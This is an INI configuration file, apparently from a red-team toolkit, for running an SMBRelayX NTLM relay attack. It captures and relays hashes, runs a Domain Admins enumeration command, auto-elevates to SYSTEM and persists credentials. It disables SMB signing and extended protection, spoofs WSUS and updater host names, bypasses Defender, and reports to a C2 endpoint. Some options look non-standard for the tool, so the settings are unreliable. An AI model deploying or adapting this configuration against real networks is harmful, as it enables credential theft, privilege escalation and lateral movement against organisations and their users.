; redteam_toolkit/lateral_movement/smb_relay/smbrelayx_config.ini
; Промышленный конфиг SMBRelayX для атак NTLM relay (MITM)

[global]
listen_interface = 0.0.0.0
listen_port = 445
relay_mode = SMB
log_path = logs/smbrelayx.log
verbose = true
save_captured_hashes = true
hash_output_file = captured_hashes.ntlm
command_shell = true
custom_command = net group "Domain Admins" /domain

[target_filter]
allowed_targets = 10.0.0.0/24,192.168.1.0/24
excluded_hosts = 10.0.0.1,192.168.1.1
hostname_blacklist = backup*,printer*,nas*,winrm*

[auth]
default_user = SYSTEM
auth_method = NTLM
relay_credentials = true
auto_elevate = true
persist_credentials = true
fallback_auth = anonymous
ignore_invalid_signing = true

[execution]
enable_command_execution = true
shell_type = cmd
payload_delivery = smbexec
upload_payload = false
custom_payload_path = payloads/relay_stub.exe
session_timeout = 60

[mitigation_bypass]
bypass_smb_signing = true
bypass_extended_protection = true
fake_signature_mode = advanced
spoof_dns_name = wsus.internal.local
spoof_netbios_name = WIN-UPDATER
bypass_defender_heuristics = true

[logging]
log_level = DEBUG
log_captures = true
log_auth_failures = true
log_command_output = true
log_timestamp_format = %Y-%m-%d %H:%M:%S
log_rotation_days = 7
log_file_max_size_mb = 20

[integration]
c2_server_url = http://127.0.0.1:8080/api/report
forward_hashes_to = responder
report_json_file = reports/relay_session.json

[advanced]
sleep_between_attempts = 2
max_attempts_per_host = 3
allow_responder_proxy = true
use_custom_pipe = \\pipe\\winlogon
enable_garbage_injection = true
force_unicode_relay = false
auto_disable_host_after_success = true
